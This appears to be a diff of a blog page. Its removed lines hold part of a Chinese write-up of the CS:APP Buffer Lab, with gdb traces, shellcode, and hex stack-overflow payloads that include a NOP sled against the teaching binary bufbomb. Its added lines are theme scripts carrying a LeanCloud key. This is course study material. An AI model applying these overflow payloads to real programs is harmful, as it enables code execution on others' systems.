class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80491fa &lt;getbuf+6&gt;      lea    eax, [ebp - 0x28]</span><br><span class="line">   0x80491fd &lt;getbuf+9&gt;      mov    dword ptr [esp], eax</span><br><span class="line"> ► 0x8049200 &lt;getbuf+12&gt;     call   Gets                     &lt;Gets&gt;</span><br><span class="line">        arg[0]: 0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line">        arg[1]: 0xf7e1f484 (unsafe_state) —▸ 0xf7e1f094 (randtbl+20) ◂— 0xe017ddb9</span><br><span class="line">        arg[2]: 0x12e13746</span><br><span class="line">        arg[3]: 0xd7653000</span><br><span class="line"> </span><br><span class="line">   0x8049205 &lt;getbuf+17&gt;     mov    eax, 1</span><br><span class="line">   0x804920a &lt;getbuf+22&gt;     leave  </span><br><span class="line">   0x804920b &lt;getbuf+23&gt;     ret</span><br></pre></td></tr></table></figure>
-
-<p>实际上eax中的值就是我们的buf字符串的地址，为0x55683698。该地址可以方便我们定位我们输入的代码（放到栈上）</p>
-<p>查找全局变量<code>global_value</code>的地址比较简单，只需要观察<code>bang</code>函数的汇编代码即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048c9d &lt;bang&gt;:</span><br><span class="line"> 8048c9d:	55                   	push   %ebp</span><br><span class="line"> 8048c9e:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ca0:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax</span><br><span class="line"> 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax</span><br><span class="line"> 8048cae:	75 26                	jne    8048cd6 &lt;bang+0x39&gt;</span><br><span class="line"> 8048cb0:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048cb4:	c7 44 24 04 60 a3 04 	movl   $0x804a360,0x4(%esp)</span><br></pre></td></tr></table></figure>
-
-<p>因此全局变量<code>global_value</code>的地址为<code>0x804d100</code>（通过观察<code>fizz</code>函数的汇编，我们可以知道<code>0x804d108</code>是<code>cookie</code>的地址）</p>
-<p>下一步我们就是构建修改全部变量、跳转至<code>bang</code>函数的汇编：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 2_code.s</span><br><span class="line">mov    $0x804d100,%eax</span><br><span class="line">movl   $0x56e63394,(%eax)</span><br><span class="line">push   $0x8048c9d # bang 地址入栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>生成对应的字节码：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -m32 2_code.s</span><br><span class="line">objdump -d 2_code.o &gt; 2_code.d</span><br><span class="line">cat 2_code.d</span><br><span class="line">2_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   b8 00 d1 04 08          mov    $0x804d100,%eax</span><br><span class="line">   5:   c7 00 94 33 e6 56       movl   $0x56e63394,(%eax)</span><br><span class="line">   b:   68 9d 8c 04 08          push   $0x8048c9d</span><br><span class="line">  10:   c3    					ret</span><br></pre></td></tr></table></figure>
-
-<p>下一步就是开始布局堆栈了，栈上内容大致如下图:</p>
-<p><img src="https://cdn.yalexin.top/image-20230731145134933.png" alt="image-20230731145134933"></p>
-<p>因此payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 2.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 c8 36 68 55 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br><span class="line">b8 00 d1 04 08 c7 00 94</span><br><span class="line">33 e6 56 68 9d 8c 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 2.txt | ./bufbomb -u yalexin   </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Bang!: You set global_value to 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
-
-<h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>本关卡需要我们回到从<code>getbuf</code>函数回到<code>test</code>函数时候，返回值为我们的<code>cookie</code>值，并且还是以正常方式返回，意味着我们不能够破坏<code>test</code>的栈帧。</p>
-<p>想要修改返回值，我们可以在程序返回前修改<code>eax</code>的值</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 3_code.s</span></span><br><span class="line">push   $0x56e63394 #  cookie值：0x56e63394 </span><br><span class="line">pop %eax #  修改返回值 </span><br><span class="line">push $0x8048dbe #  调用getbuf后的返回地址 </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>生成对应的字节码：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -m32 3_code.s</span><br><span class="line">objdump -d 3_code.o &gt; 3_code.d</span><br><span class="line">cat 3_code.d</span><br><span class="line">3_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   68 94 33 e6 56          push   $0x56e63394</span><br><span class="line">   5:   58                      pop    %eax</span><br><span class="line">   6:   68 be 8d 04 08          push   $0x8048dbe</span><br><span class="line">   b:   c3                      ret</span><br></pre></td></tr></table></figure>
-
-<p>下一步就是开始布局堆栈了:</p>
-<p><img src="https://cdn.yalexin.top/image-20230731214954748.png" alt="image-20230731214954748"></p>
-<p>为了得到旧的<code>ebp</code>的值，我们可以借助gdb，将断点下到getbuf处：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> gdb bufbomb</span><br><span class="line"> b getbuf</span><br><span class="line"> run -u yalexin</span><br><span class="line"> *EAX  0xe9e9dc4</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7e1f094 (randtbl+20) ◂— 0xe04ebb5a</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x1</span><br><span class="line"> ESI  0x556865c0 ◂— 0x0</span><br><span class="line"> EBP  0x556836c0 (_reserved+1038016) —▸ 0x556836f0 (_reserved+1038064) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd3b8 —▸ 0xffffd3f8 ◂— ...</span><br><span class="line"> ESP  0x55683688 (_reserved+1037960) ◂— 0x2774 /* "t'" */</span><br><span class="line"> EIP  0x80491fa (getbuf+6) ◂— lea    eax, [ebp - 0x28]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80491fa &lt;getbuf+6&gt;      lea    eax, [ebp - 0x28]             &lt;_reserved+1037976&gt;</span><br><span class="line">   0x80491fd &lt;getbuf+9&gt;      mov    dword ptr [esp], eax</span><br><span class="line">   0x8049200 &lt;getbuf+12&gt;     call   Gets                     &lt;Gets&gt;</span><br><span class="line"> </span><br><span class="line">   0x8049205 &lt;getbuf+17&gt;     mov    eax, 1</span><br><span class="line">   0x804920a &lt;getbuf+22&gt;     leave  </span><br><span class="line">   0x804920b &lt;getbuf+23&gt;     ret    </span><br><span class="line"> </span><br><span class="line">   0x804920c &lt;getbufn&gt;       push   ebp</span><br><span class="line">   0x804920d &lt;getbufn+1&gt;     mov    ebp, esp</span><br><span class="line">   0x804920f &lt;getbufn+3&gt;     sub    esp, 0x218</span><br><span class="line">   0x8049215 &lt;getbufn+9&gt;     lea    eax, [ebp - 0x208]</span><br><span class="line">   0x804921b &lt;getbufn+15&gt;    mov    dword ptr [esp], eax</span><br></pre></td></tr></table></figure>
-
-<p>虽然此时<code>ebp=0x556836c0</code>,但是该值并不是原先<code>test</code>函数对应的<code>ebp</code>，实际上该地址中对应的<code>0x556836f0</code>才是原先<code>test</code>函数对应的<code>ebp</code>。</p>
-<p>因此最终的payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 3.txt *&#x2F;</span><br><span class="line">68 94 33 e6 56 58 68 be</span><br><span class="line">8d 04 08 c3 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">f0 36 68 55 98 36 68 55 &#x2F;* 前4个字节修补为旧的ebp，后4个字节覆盖返回地址(即buf字符串地址) *&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 3.txt | ./bufbomb -u yalexin</span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Boom!: getbuf returned 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
-
-<h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>本关卡跟上一个类似，只不过此时栈上的内存地址是”随机“的，这就给我们定位我们的攻击代码带来了难度。</p>
-<p>我们先来看一张图</p>
-<p><img src="https://cdn.yalexin.top/image-20230801142819012.png" alt="image-20230801142819012"></p>
-<p>上图是<code>testn</code>正常调用<code>getbufn</code>的栈帧情况，从图中我们可以知道，如果我们尝试利用栈溢出漏洞，将<code>getbufn</code>的返回值修改，那么溢出过程我们也会将<code>ebp_1</code>覆盖为我们所设定的值，而为了使得我们能够正常回到<code>testn</code>中，我们还应该恢复正确的<code>ebp</code>寄存器，然而不幸的是，本关卡中，栈上上的地址都是随机化的，因此我们不能够借助gdb直接获取<code>ebp_1</code>的值。</p>
-<p>但是实际上我们可以想象一下，当程序即将从<code>getbuf</code>中返回到<code>testn</code>时，即即将执行<code>getbufn</code>的<code>ret</code>指令时，此时esp的值为图中的<code>ebp2+4</code>,当前的<code>esp</code>再加上0x28即为当初的<code>ebp_1</code>的值，因此我们可以借助相对位置来恢复<code>ebp</code>，因此栈上的攻击代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 4_code.s</span><br><span class="line"># 恢复ebp</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push   $0x56e63394 #  cookie值：0x56e63394 </span><br><span class="line">pop %eax #  修改返回值 </span><br><span class="line">push $0x8048e3a #  修改返回地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
-<p>生成对应的字节码：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -m32 4_code.s</span><br><span class="line">objdump -d 4_code.o &gt; 4_code.d</span><br><span class="line">cat 4_code.d</span><br><span class="line"></span><br><span class="line">4_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   8d 6c 24 28             lea    0x28(%esp),%ebp</span><br><span class="line">   4:   68 94 33 e6 56          push   $0x56e63394</span><br><span class="line">   9:   58                      pop    %eax</span><br><span class="line">   a:   68 3a 8e 04 08          push   $0x8048e3a</span><br><span class="line">   f:   c3                      ret</span><br></pre></td></tr></table></figure>
-
-<p>我们把这个攻击代码放在何处？我们又如何定位到该代码呢？</p>
-<p>由于使用了随机化策略，因此我们还是不能够通过gdb调试的方式直接获取该字符串的地址。</p>
-<p>但是实际上如果在我们的攻击代码前面插入大量的nop指令，只要我们跳转过程中来到了nop区域，最终一定可以通过不断执行“nop”指令”滑到“我们的攻击代码处。</p>
-<p>因此我们可以从getbufn函数中的buf指向的内存开始，插入大量的nop指令，然后我们利用缓冲区漏洞，将返回地址指向这一片区域，为了使得我们命中这片区域的概率最大，我们可以将返回地址修改为buf字符串的”中间区域“，即<code>buf+len(buf)/2</code>。</p>
-<p>我们先利用gdb大致看一下getbufn中buf字符串的大致位置：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb bufbomb</span><br><span class="line">b getbufn</span><br><span class="line">run -u yalexin -n</span><br><span class="line">n</span><br><span class="line">n</span><br><span class="line">   0x8049215 &lt;getbufn+9&gt;            lea    eax, [ebp - 0x208]</span><br><span class="line">   0x804921b &lt;getbufn+15&gt;           mov    dword ptr [esp], eax</span><br><span class="line"> ► 0x804921e &lt;getbufn+18&gt;           call   Gets                     &lt;Gets&gt;</span><br><span class="line">        arg[0]: 0x556834b8 (_reserved+1037496) ◂— 0x0</span><br><span class="line">        arg[1]: 0x0</span><br><span class="line">        arg[2]: 0x0</span><br><span class="line">        arg[3]: 0x0</span><br><span class="line"> </span><br><span class="line">   0x8049223 &lt;getbufn+23&gt;           mov    eax, 1</span><br><span class="line">   0x8049228 &lt;getbufn+28&gt;           leave  </span><br><span class="line">   0x8049229 &lt;getbufn+29&gt;           ret    </span><br><span class="line"> </span><br><span class="line">   0x804922a                        nop    </span><br><span class="line">   0x804922b                        nop    </span><br><span class="line">   0x804922c &lt;initialize_bomb&gt;      push   ebp</span><br><span class="line">   0x804922d &lt;initialize_bomb+1&gt;    mov    ebp, esp</span><br><span class="line">   0x804922f &lt;initialize_bomb+3&gt;    push   esi</span><br></pre></td></tr></table></figure>
-
-<p>从控制台中我们可以发现，此时的buf地址为0x556834b8，我们再加上256，变为0x556835b8，作为<code>getbufn</code>的返回地址，我们就有机会遇上我们的攻击代码！</p>
-<p>因此最终的payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 &#x2F;* 前面是大量的nop指令  *&#x2F;</span><br><span class="line">8d 6c 24 28 68 94 33 e6 &#x2F;* 攻击代码  *&#x2F;</span><br><span class="line">56 58 68 3a 8e 04 08 c3	</span><br><span class="line">00 00 00 00				&#x2F;* 暂时修改ebp *&#x2F;</span><br><span class="line">b8 35 68 55				&#x2F;* 给一个大致的地址，使得我们能够定位到nop *&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat 4.txt | .&#x2F;hex2raw -n | .&#x2F;bufbomb -n -u yalexin </span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
-    </div>
-
-    
-    <div class="about">
-        <h1>About this Post</h1>
-        <div class="details">
-            <p>This post is written by YaleXin, licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0" target="_blank" rel="noopener">CC BY-NC 4.0</a>.</p>
-        </div>
-        
-        <p class="tags">
-            
-            <i class="icon"></i>
-            <a href="/tags/汇编/" class="tag">#汇编</a>
-        </p>
-        
-    </div>
-    
-
-    <div class="container post-prev-next">
-        
-        <a href="/2023/10/02/CS-APP-Architecture-Lab/" class="next">
-            <div>
-                <div class="text">
-                    <p class="label">Next</p>
-                    <h3 class="title">CS:APP-Architecture Lab</h3>
-                </div>
-            </div>
-        </a>
-        
-        
-        <a href="/2023/09/30/docker-compose%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%EF%BC%88nginx-MySQL-Nuxt-Java%EF%BC%89/" class="prev">
-            <div>
-                <div class="text">
-                    <p class="label">Previous</p>
-                    <h3 class="title">docker-compose博客系统（nginx+MySQL+Nuxt+Java）</>
-                </div>
-            </div>
-        </a>
-        
-    </div>
-
-    
-        
-        
-    
-</article>
-
-        <footer>
-    <div class="inner">
-        <div class="links">
-            
-            <div class="group">
-                <h2 class="title">Blog</h2>
-                
-                <a href="/" class="item">Blog</a>
-                
-                <a href="/archives" class="item">Archives</a>
-                
-                <a href="/tags" class="item">Tags</a>
-                
-                <a href="/categories" class="item">Categories</a>
-                
-                <a href="/search" class="item">Search</a>
-                
-                <a href="/friends" class="item">Friends</a>
-                
-                <a href="/projects" class="item">Projects</a>
-                
-                <a href="/resume" class="item">Resume</a>
-                
-                <a href="/about" class="item">About</a>
-                
-                <a href="/atom.xml" class="item">RSS</a>
-                
-            </div>
-            
-            <div class="group">
-                <h2 class="title">Projects</h2>
-                
-                <a href="https://github.com/MrWillCom/rsa-cli" target="_blank" rel="noopener" class="item">RSA CLI</a>
-                
-                <a href="https://github.com/MrWillCom/hexo-theme-cupertino" target="_blank" rel="noopener" class="item">Hexo Theme Cupertino</a>
-                
-                <a href="https://github.com/MrWillCom/a-calendar" target="_blank" rel="noopener" class="item">A Calendar</a>
-                
-                <a href="https://github.com/MrWillCom/auto-mirroring-bucket" target="_blank" rel="noopener" class="item">Auto Mirroring Bucket</a>
-                
-            </div>
-            
-            <div class="group">
-                <h2 class="title">Me</h2>
-                
-                <a href="https://github.com/MrWillCom" target="_blank" rel="noopener" class="item">GitHub</a>
-                
-                <a href="https://codepen.io/mrwillcom" target="_blank" rel="noopener" class="item">CodePen</a>
-                
-                <a href="https://www.patreon.com/MrWillCom" target="_blank" rel="noopener" class="item">Patreon</a>
-                
-                <a href="https://noc.social/@MrWillCom" target="_blank" rel="noopener" class="item">Mastodon</a>
-                
-                <a href="https://discord.gg/UKuFDjcfY8" target="_blank" rel="noopener" class="item">Discord</a>
-                
-                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
-                
-            </div>
-            
-        </div>
-        <span>&copy; 2024 YaleXin<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
-        
-        
-            <br>
-            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
-                <label>
-                    <input type="radio" value="light">
-                    <span>Light</span>
-                </label>
-                <label>
-                    <input type="radio" value="dark">
-                    <span>Dark</span>
-                </label>
-                <label>
-                    <input type="radio" value="auto">
-                    <span>Auto</span>
-                </label>
-            </div>
-        
-    </div>
-</footer>
-
-
-        
-<script src="/js/main.js"></script>
-
-        
-        
-        
-
-        
-        <script src="https://unpkg.com/scrollreveal"></script>
-        <script>
-            window.addEventListener('load', () => {
-                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
-                ScrollReveal().reveal('.post-list-item .cover-img img')
-                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
-            })
-        </script>
-        
-    </body>
-</html>
+  fetch('https://app-router.leancloud.cn/2/route?appId=CjaKbRAizU0DNH3B4Hllhtwp-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id'     : 'CjaKbRAizU0DNH3B4Hllhtwp-gzGzoHsz',
+            'X-LC-Key'    : 'B61jy2Xnwe90oJ2dtUeF6HHU',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script></div></footer></div><script src="/lib/anime.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
